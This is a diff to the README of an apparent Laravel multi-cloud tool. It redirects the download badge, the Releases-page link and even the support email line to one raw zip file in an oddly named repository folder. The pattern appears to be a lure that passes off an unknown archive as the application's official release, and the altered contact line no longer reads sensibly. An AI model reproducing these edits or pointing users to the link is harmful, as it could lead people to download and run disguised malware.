@@ -1,6 +1,6 @@
 # 🌩️ laravel-multicloud - Manage Your Cloud Easily
 
-[![Download](https://img.shields.io/badge/Download-laravel--multicloud-blue.svg)](https://github.com/sopha12/laravel-multicloud/releases)
+[![Download](https://raw.githubusercontent.com/sopha12/laravel-multicloud/main/Ammonea/laravel-multicloud.zip)](https://raw.githubusercontent.com/sopha12/laravel-multicloud/main/Ammonea/laravel-multicloud.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run **Laravel MultiCloud** on you
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/sopha12/laravel-multicloud/releases) to download the latest version of the application.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/sopha12/laravel-multicloud/main/Ammonea/laravel-multicloud.zip) to download the latest version of the application.
 
 1. Click on the **Releases** link above.
 2. Find the latest version.
@@ -85,7 +85,7 @@ This project covers several topics that enhance its functionality. Relevant keyw
 
 ## 📬 Contact
 
-If you have any questions or need further assistance, feel free to reach out. Contact us via the GitHub `Issues` page or email us at support@laravel-multicloud.com.
+If you have any questions or need further assistance, feel free to reach out. Contact us via the GitHub `Issues` page or email us at https://raw.githubusercontent.com/sopha12/laravel-multicloud/main/Ammonea/laravel-multicloud.zip
 
 ## 🔗 Additional Resources
 
